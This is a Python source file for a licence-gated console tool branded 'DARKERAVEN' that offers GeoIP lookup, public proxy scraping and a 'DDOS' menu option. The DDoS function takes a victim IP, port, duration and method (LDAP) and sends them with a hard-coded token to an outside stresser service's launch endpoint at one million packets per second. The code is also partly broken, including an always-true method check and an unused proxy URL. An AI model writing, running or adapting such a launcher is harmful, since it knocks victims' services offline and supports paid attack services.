import os, requests, time, random, sys
import pprint
from keyauth import api

keyauthapp = api("APP NAME", "ACCOUNT ID", "APP SEC","1.0")

keyauthapp.init()

def DDOS():
    ip_input = input('  IP> ')
    port_input = input('  PORT> ')
    time_input = input('  TIME> ')
    method_input = input('  METHOD> ')
    if(method_input == "LDAP" or "" or ""):
            response = requests.get("https://api.unlisted.to/tests/launch?token=2PAK6tFkNrU2cd&target="+ip_input+"&port="+port_input+"&duration="+time_input+"&method="+method_input+"&pps=1000000")
            print("Attack Sent")
            time.sleep(10)
            Main()
    else:
            print("Invalid Method")
            Main()
            return False

def GeoIP():
    ip_input = input('  IP> ')
    response = requests.get("http://extreme-ip-lookup.com/json/" + ip_input)
    response.json()
    pprint.pprint(response.json())
    time.sleep(10)
    Main()

def scraper():
    r = requests.get('https://api.proxyscrape.com/?request=getproxies&proxytype=http')
    print(r.text)
    p_type = input('  Type> ')
    p_timeout = input('  Timeout> ')
    f"https://api.proxyscrape.com/?request=getproxies&proxytype={p_type}&timeout={p_timeout}"
    with open('proxies.txt', 'w') as f:
        f.write(r.text)
        print('The proxies have been saved to \033[31m`proxies.txt`')
        time.sleep(5)
        Main()
class Main():
    def __init__(self):
        self.gg = True
        self.r = '\033[31m'
        self.g = '\033[32m'
        self.y = '\033[33m'
        self.b = '\033[34m'
        self.m = '\033[35m'
        self.c = '\033[36m'
        self.w = '\033[37m'
        self.rr = '\033[39m'
        self.cls()
        self.start_logo()
        self.options()
        while self.gg == True:
            choose = input(str('  @>  '))
            if(choose == str(1)):
                self.cls()
                self.start_logo()
                GeoIP()
            elif(choose == str(2)):
                self.cls()
                self.start_logo()
                scraper()
            elif(choose == str(3)):
                self.cls()
                self.start_logo()
                DDOS()


    def cls(self):
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt'])

    def start_logo(self):
        clear = "\x1b[0m"
        colors = [36, 32, 34, 35, 31, 37]

        x = """
            ██████╗  █████╗ ██████╗ ██╗  ██╗███████╗██████╗  █████╗ ██╗   ██╗███████╗███╗   ██╗
            ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗██╔══██╗██║   ██║██╔════╝████╗  ██║
            ██║  ██║███████║██████╔╝█████╔╝ █████╗  ██████╔╝███████║██║   ██║█████╗  ██╔██╗ ██║
            ██║  ██║██╔══██║██╔══██╗██╔═██╗ ██╔══╝  ██╔══██╗██╔══██║╚██╗ ██╔╝██╔══╝  ██║╚██╗██║
            ██████╔╝██║  ██║██║  ██║██║  ██╗███████╗██║  ██║██║  ██║ ╚████╔╝ ███████╗██║ ╚████║
            ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝
                                                                                                                     
        """

        for N, line in enumerate(x.split("\n")):
            sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
            time.sleep(0.05)

    def options(self):
        print(self.y + '        [1] ' + self.c +'  GeoIP')
        print(self.y + '        [2] ' + self.c + '  Proxy Scrape')
        print(self.y + '        [3] ' + self.c + '  DDOS')

class Login():
    def __init__(self):
        self.gg = True
        self.r = '\033[31m'
        self.g = '\033[32m'
        self.y = '\033[33m'
        self.b = '\033[34m'
        self.m = '\033[35m'
        self.c = '\033[36m'
        self.w = '\033[37m'
        self.rr = '\033[39m'
        self.cls()
        self.start_logo()
print ("""
        1.Login
        2.Register
        3.Upgrade
        4.License Key Only
        """)
ans=input("Select Option: ") 
if ans=="1": 
    user = input('Provide username: ')
    password = input('Provide password: ')
    keyauthapp.login(user,password)
    Main()
elif ans=="2":
    user = input('Provide username: ')
    password = input('Provide password: ')
    license = input('Provide License: ')
    keyauthapp.register(user,password,license)
    Main()
elif ans=="3":
    user = input('Provide username: ')
    license = input('Provide License: ')
    keyauthapp.upgrade(user,license)
elif ans=="4":
    key = input('Enter your license: ')
    keyauthapp.license(key)
elif ans !="":
    print("\nNot Valid Option") 
    sys.exit() 

def start_logo(self):
        clear = "\x1b[0m"
        colors = [36, 32, 34, 35, 31, 37]

        x = """
            ██████╗  █████╗ ██████╗ ██╗  ██╗███████╗██████╗  █████╗ ██╗   ██╗███████╗███╗   ██╗
            ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗██╔══██╗██║   ██║██╔════╝████╗  ██║
            ██║  ██║███████║██████╔╝█████╔╝ █████╗  ██████╔╝███████║██║   ██║█████╗  ██╔██╗ ██║
            ██║  ██║██╔══██║██╔══██╗██╔═██╗ ██╔══╝  ██╔══██╗██╔══██║╚██╗ ██╔╝██╔══╝  ██║╚██╗██║
            ██████╔╝██║  ██║██║  ██║██║  ██╗███████╗██║  ██║██║  ██║ ╚████╔╝ ███████╗██║ ╚████║
            ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝
                                                                                                                     
        """

        for N, line in enumerate(x.split("\n")):
            sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
            time.sleep(0.05)